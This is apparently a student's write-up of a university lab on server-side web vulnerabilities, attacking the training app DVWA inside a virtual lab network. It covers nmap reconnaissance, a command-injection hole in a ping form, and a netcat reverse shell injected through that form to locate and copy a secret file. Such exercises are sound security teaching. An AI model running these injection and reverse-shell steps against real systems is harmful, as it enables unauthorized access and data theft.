Tutorial 4: Server-Side Web Vulnerabilities
===========================================

Gathering information on `dvwa`
-------------------------------
We are exploiting a web application hosted on `dvwa`. As such, we want to gather the following information:
1. `dvwa`'s IP address
2. The operating system it's running
3. The web server software (and version) it's using to serve content
4. The version of PHP being used to execute PHP scripts hosted on the web server

This can be done using `nmap`:
1. I tried `nmap -sP 10.6.66.1/24`, like in the previous lab to try and find `dvwa`'s IP. However this only revealed 10.6.66.1 (DHCP server) and 10.6.66.64 (`kali_vm` or ourselves). That's cause I didn't launch `dvwa` (I might be slightly retarded). After launching it, I identified its IP as **10.6.66.42**.
2. To identify the OS, I used `nmap -O 10.6.66.42`, which provided the following relevant information:
```
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel.:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
```
This identifies the OS as anything between Linux 3.2 and 4.9.
3. `nmap -sSV 10.6.66.42` was used to perform a scan of the popular TCP ports and identify their versions:
```
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian) PHP/5.6.29-0+deb8u1)
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 08:00:27:05:A6:4D (Oracle VirtualBox virtual NIC)
```
This not only identified the web server software as **Apache 2.4.10**, but also identified the PHP version as **5.6**

**Questions**
1. The way `nmap` determines a host's operating system is that it sends specific tcp packets and fingerprint the responses using TCP/IPS fingerprinting. The Linux 3.2 - 4.9 OS must send out the same response, and as such it can't distinguish between them.
2. Another way to gain information about the operating system can be using the version provided by `nmap`'s TCP scan. We can see that Apache is running on Debian. The '+deb8u1' indicates that it's Debian 8 (also called "jessie"), see [**here**](https://unix.stackexchange.com/questions/119158/why-do-some-debian-packages-have-a-deb7u2-suffix).
3. An administrator of `dvwa` could setup a firewall to block connections from certain IP addresses. *Check solutions when they're released*

Finding vulnerabilities in `dvwa`
---------------------------------
After connecting to the `dvwa` webpage, we are told to use the *Command Injection* or *File Upload* sections and exploit a vulnerability present in the source code to find a hidden file.

**Command Injection**
*Security Level: low*
Looking at the source code, we can see the following lines of interest:
```
$target = $_REQUEST[ 'ip' ]; // Extracts input we provide to the prompt in the webapp
$cmd = shell_exec( 'ping  -c 4 ' . $target ); // Directly inserts the input into a shell command
```
Looking at this, if we insert a `;` (shell command seperator), `&` (makes preceding command run in background) or `&&` (runs succeeding command sequentially), we can insert another shell command afterwards to be run. To start with, I probed using `; ls -la`, which printed the web-app's working directory on the webpage.

A more interesting exploit that can be done with this is opening a [**reverse-shell**](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/), which essentially gives us a shell in our host computer that executes commands on the target computer. I set it up as follows:
1. Run `nc -lvp 42069` on `kali-vm` (or your attacker computer), where 42069 is the desired TCP port we will be running the connection over.
2. Trick `dvwa` (or victim) into running `nc 10.6.66.64 42069 -e /bin/bash`, where `10.6.66.64` is `kali-vm`'s IP and `42069` is the port we are listening on.
3. In the terminal where you ran netcat on your attacker computer you now have a bash terminal inside the victim!

From here I used the [**locate**](https://linuxize.com/post/locate-command-in-linux/) command as follows: `locate -i secret`, which returns all filenames which contain 'secret' (`-i` makes it case invariant). This identified the secret file in `/home/csn/THIS_IS_THE_SECRET_FILE.txt`. I used `cat` to check the file contents and copied it onto my local machine. MISSION SUCCESS!
